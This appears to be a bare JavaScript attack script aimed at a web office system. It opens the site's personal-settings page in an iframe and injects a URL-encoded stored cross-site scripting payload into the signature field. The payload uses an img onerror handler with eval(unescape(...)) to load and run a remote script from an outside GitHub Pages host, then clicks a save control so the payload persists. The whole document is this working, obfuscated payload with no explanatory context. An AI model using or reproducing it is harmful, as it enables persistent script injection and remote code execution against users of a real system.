alert(777);
var proxy_frame = document.createElement("iframe");
proxy_frame.src = "https://oa.panda-assets.com/ekp/sys/person/";
proxy_frame.height = "100%";
proxy_frame.width = "100%";
document.body.appendChild(proxy_frame);
proxy_frame.onload = function () {
    proxy_frame.contentWindow.fdSignatureArea.value = '"><img%20src=x%20onerror=eval(unescape(%27var%2520proxy_scripts%2520%253D%2520document.createElement%2528%2522script%2522%2529%253Bproxy_scripts.src%2520%253D%2520%2522https%253A//cstcamaro.github.io/MyApi/test.js%2522%253Bdocument.body.appendChild%2528proxy_scripts%2529%253B%27))><!--';
    proxy_frame.contentDocument.getElementById("lui-id-34").click()
}
